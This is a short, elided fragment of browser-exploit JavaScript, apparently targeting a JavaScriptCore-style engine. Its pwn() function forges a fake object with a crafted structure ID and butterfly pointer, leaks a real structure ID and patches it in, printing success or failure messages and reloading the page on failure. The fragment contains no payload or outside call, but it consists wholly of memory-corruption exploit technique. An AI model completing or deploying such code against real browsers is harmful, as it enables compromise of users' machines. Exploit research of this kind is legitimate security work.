...
function pwn() {
  ...
  let hostObj = {
    ...
    id: (new Int64('0x0108221700000000')).asJSValue(),
    butterfly: attackObj,
    o: {}
  };
  ...
  let rawStructureId =  get(fakeHostObj, 0);
  if (!rawStructureId) {
    print("[-] Failed to  leak..");
    window.location.reload();
    return;
  }
  var leakStructureId = Int64.fromDouble(rawStructureId);
  print('[+] Leaked structure ID: ' + leakStructureId);

  hostObj.id = leakStructureId.asDouble();
